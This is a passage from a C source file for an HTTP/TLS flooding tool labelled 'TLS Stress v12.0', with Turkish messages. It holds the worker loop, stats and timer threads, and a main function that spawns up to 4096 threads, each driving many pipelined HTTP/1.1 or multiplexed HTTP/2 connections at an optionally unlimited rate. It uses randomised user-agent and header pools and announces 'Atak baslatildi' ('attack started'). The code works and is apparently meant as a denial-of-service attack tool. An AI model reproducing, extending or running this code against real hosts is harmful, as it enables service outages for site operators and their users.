            h1_getbyte(c,&d1); h1_getbyte(c,&d2);
          }
        }

        completed++;
        p->inflight--;p->completed++;
        p->header_done=0;p->hpos=0;p->content_len=-1;p->chunked=0;p->body_rem=0;
      }
      if(p->inflight==0) goto retry;
h1_yield:;}
    return completed;}
  default:return -1;}
}

/* ════════════════════════════════════════════════════════════════
 * Worker
 * ════════════════════════════════════════════════════════════════ */
typedef struct{SSL_CTX *c1,*c2;int id;}warg_t;

static void *worker(void *arg)
{ warg_t *a=(warg_t*)arg;
  tbkt_t bkt;bkt_init(&bkt,G.rps);
  int epfd=epoll_create1(0);if(epfd<0)return NULL;

  conn_t *pool=calloc(CONNS_PER_THREAD,sizeof(conn_t));
  for(int i=0;i<CONNS_PER_THREAD;i++){
    pool[i].fd=-1;
    conn_reset(&pool[i],epfd,a->c1,a->c2);
    if(i<CONNS_PER_THREAD-1)usleep(1000000/CONNS_PER_THREAD);}

  struct epoll_event evs[MAX_EVENTS];
  long lok=0,lfail=0;int flush=0;

  while(g_run){
    int n=epoll_wait(epfd,evs,MAX_EVENTS,EPOLL_MS);
    for(int i=0;i<n;i++){
      conn_t *c=(conn_t*)evs[i].data.ptr;
      if(evs[i].events&(EPOLLHUP|EPOLLERR|EPOLLRDHUP)){lfail++;conn_reset(c,epfd,a->c1,a->c2);continue;}
      int rc=conn_drive(c,epfd,a->c1,a->c2,&bkt);
      if(rc<0){lfail++;conn_reset(c,epfd,a->c1,a->c2);}else lok+=rc;}
    for(int i=0;i<CONNS_PER_THREAD;i++)
      if(pool[i].state==CS_DEAD)conn_reset(&pool[i],epfd,a->c1,a->c2);
    if(++flush>=FLUSH_EVERY){
      atomic_fetch_add(&g_ok,lok);atomic_fetch_add(&g_fail,lfail);
      lok=lfail=0;flush=0;}}

  atomic_fetch_add(&g_ok,lok);atomic_fetch_add(&g_fail,lfail);
  for(int i=0;i<CONNS_PER_THREAD;i++){
    conn_t *c=&pool[i];
    if(c->h2s)nghttp2_session_del(c->h2s);
    if(c->ssl){SSL_shutdown(c->ssl);SSL_free(c->ssl);}
    if(c->fd>=0)close(c->fd);
    if(c->sess)SSL_SESSION_free(c->sess);}
  free(pool);close(epfd);return NULL; }

/* ── Timer ────────────────────────────────────────────────────── */
static void *timer_fn(void *a){(void)a;sleep(G.duration);g_run=0;return NULL;}

/* ── Stats ────────────────────────────────────────────────────── */
static void *stats_fn(void *a)
{ (void)a;long po=0,pf=0;struct timespec tp,tn;
  clock_gettime(CLOCK_MONOTONIC,&tp);
  printf("\n %-5s  %-12s  %-10s  %-12s  %s\n","t(s)","Basarili","Fail","RPS","MB");
  printf(" ───────────────────────────────────────────────\n");
  for(int s=1;s<=G.duration;s++){
    sleep(1);clock_gettime(CLOCK_MONOTONIC,&tn);
    double dt=(tn.tv_sec-tp.tv_sec)+(tn.tv_nsec-tp.tv_nsec)/1e9;tp=tn;
    long co=atomic_load(&g_ok),cf=atomic_load(&g_fail),kb=atomic_load(&g_kb);
    long dok=co-po,dfail=cf-pf;po=co;pf=cf;
    double rps=dt>0?(double)(dok+dfail)/dt:0.0;double mb=(double)kb/1024.0;
    printf("\r %-5d  %-12ld  %-10ld  %-12.0f  %.1f   ",s,co,cf,rps,mb);
    fflush(stdout);}
  printf("\n");return NULL; }

/* ── main ─────────────────────────────────────────────────────── */
int main(int argc,char *argv[])
{ signal(SIGPIPE,SIG_IGN);
  if(argc<6){
    fprintf(stderr,"\nKullanim: %s <host> <port> <sure> <thread> <rps_per_thread> [proto] [tls]\n"
      "  rps=0 -> sinirsiz\n  proto -> auto|h1|h2\n  tls -> tls12|tls13\n\n",argv[0]);
    return 1;}

  strncpy(G.host,argv[1],MAX_HOST-1);
  G.port=atoi(argv[2]);G.duration=atoi(argv[3]);
  G.nthread=atoi(argv[4]);G.rps=atol(argv[5]);
  G.proto=PROTO_AUTO;G.tls=TLS_AUTO;
  for(int i=6;i<argc;i++){
    if     (!strcmp(argv[i],"h1"))    G.proto=PROTO_H1;
    else if(!strcmp(argv[i],"h2"))    G.proto=PROTO_H2;
    else if(!strcmp(argv[i],"tls12")) G.tls=TLS_12;
    else if(!strcmp(argv[i],"tls13")) G.tls=TLS_13;}

  if(G.port<=0||G.port>65535){fputs("port hatali\n",stderr);return 1;}
  if(G.duration<=0){fputs("sure>0\n",stderr);return 1;}
  if(G.nthread<=0||G.nthread>4096){fputs("thread 1-4096\n",stderr);return 1;}

  if(dns_once()){fprintf(stderr,"DNS fail: %s\n",G.host);return 1;}

  printf("\n [*] Header pool uretiliyor...\n");
  unsigned int seed=(unsigned int)time(NULL)^(unsigned int)getpid();
  gen_ua(seed);
  char auth[MAX_HOST+8];snprintf(auth,sizeof(auth),"%s:%d",G.host,G.port);
  gen_pipebuf(auth,seed);
  gen_h2nv(auth,seed);
  printf(" [+] %d UA, %d H1-pipeline, %d H2-nv seti hazir.\n",
         UA_COUNT,PIPEBUF_COUNT,HDR_COUNT);

  SSL_library_init();SSL_load_error_strings();OpenSSL_add_all_algorithms();
  SSL_CTX *ctx1=new_ctx(0),*ctx2=new_ctx(1);
  if(!ctx1||!ctx2){fputs("SSL ctx fail\n",stderr);return 1;}

  const char *pstr=G.proto==PROTO_H1?"H1 pipeline":G.proto==PROTO_H2?"H2 mux":"AUTO";
  const char *tstr=G.tls==TLS_12?"TLS1.2":G.tls==TLS_13?"TLS1.3":"TLS1.2+";
  char rstr[48];
  if(G.rps>0)snprintf(rstr,sizeof(rstr),"%ld/t -> %ld toplam",G.rps,G.rps*G.nthread);
  else       snprintf(rstr,sizeof(rstr),"SINIRSIZ");

  printf("\n");
  printf(" ╔══════════════════════════════════════════╗\n");
  printf(" ║    TLS Stress v12.0  bulk-parse+opt      ║\n");
  printf(" ╠══════════════════════════════════════════╣\n");
  printf(" ║  Host     : %-28s  ║\n",G.host);
  printf(" ║  Port     : %-28d  ║\n",G.port);
  printf(" ║  Thread   : %-28d  ║\n",G.nthread);
  printf(" ║  Sure     : %-25d sn   ║\n",G.duration);
  printf(" ║  RPS      : %-28s  ║\n",rstr);
  printf(" ║  Proto    : %-28s  ║\n",pstr);
  printf(" ║  TLS      : %-28s  ║\n",tstr);
  printf(" ║  Conn/T   : %-28d  ║\n",CONNS_PER_THREAD);
  printf(" ╚══════════════════════════════════════════╝\n");
  printf("\n [*] Atak baslatildi...\n");

  pthread_t tmr,sts;
  pthread_create(&tmr,NULL,timer_fn,NULL);
  pthread_create(&sts,NULL,stats_fn,NULL);

  warg_t *wa=calloc(G.nthread,sizeof(warg_t));
  pthread_t *td=calloc(G.nthread,sizeof(pthread_t));
  for(int i=0;i<G.nthread;i++){
    wa[i].c1=ctx1;wa[i].c2=ctx2;wa[i].id=i;
    pthread_create(&td[i],NULL,worker,&wa[i]);}

  for(int i=0;i<G.nthread;i++)pthread_join(td[i],NULL);
  pthread_join(tmr,NULL);pthread_join(sts,NULL);

  long tok=atomic_load(&g_ok),tfail=atomic_load(&g_fail);
  long tot=tok+tfail;double mb=(double)atomic_load(&g_kb)/1024.0;

  printf("\n [*] Atak durduruldu.\n\n");
  printf(" ╔══════════════════════════════════════════╗\n");
  printf(" ║  Toplam   : %-28ld  ║\n",tot);
  printf(" ║  Basarili : %-28ld  ║\n",tok);
  printf(" ║  Fail     : %-28ld  ║\n",tfail);
  printf(" ║  Ort RPS  : %-28.0f  ║\n",G.duration>0?(double)tot/G.duration:0.0);
  printf(" ║  Veri     : %-25.1f MB   ║\n",mb);
  printf(" ╚══════════════════════════════════════════╝\n\n");

  for(int i=0;i<PIPEBUF_COUNT;i++) free(g_pipes[i].data);
  SSL_CTX_free(ctx1);SSL_CTX_free(ctx2);
  free(wa);free(td);return 0; }
